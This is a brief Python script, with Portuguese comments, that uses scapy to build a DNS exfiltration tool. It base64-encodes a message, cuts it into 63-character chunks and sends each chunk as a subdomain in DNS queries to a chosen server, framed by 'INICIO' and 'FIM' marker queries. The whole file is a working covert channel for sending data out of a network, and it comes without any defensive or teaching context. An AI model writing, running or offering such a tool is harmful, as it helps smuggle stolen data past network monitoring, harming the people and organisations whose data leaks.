from scapy.all import *
import base64
import argparse

def dns_exfil(data, server, domain):
    # Pacote de INICIO
    pkt = IP(dst=server)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=f"INICIO.{domain}"))
    send(pkt)

    # Pacotes da mensagem
    data = base64.b64encode(data.encode()).decode()
    for i in range(0, len(data), 63):
        subdomain = data[i:i+63]
        pkt = IP(dst=server)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=f"{subdomain}.{domain}"))
        send(pkt)

    # Pacote de FIM
    pkt = IP(dst=server)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=f"FIM.{domain}"))
    send(pkt)

parser = argparse.ArgumentParser(description="Send a message over DNS")
parser.add_argument('message', type=str, help='The message to send')
parser.add_argument('server', type=str, help='The DNS server IP')
parser.add_argument('domain', type=str, help='The domain to use')

args = parser.parse_args()

dns_exfil(args.message, args.server, args.domain)
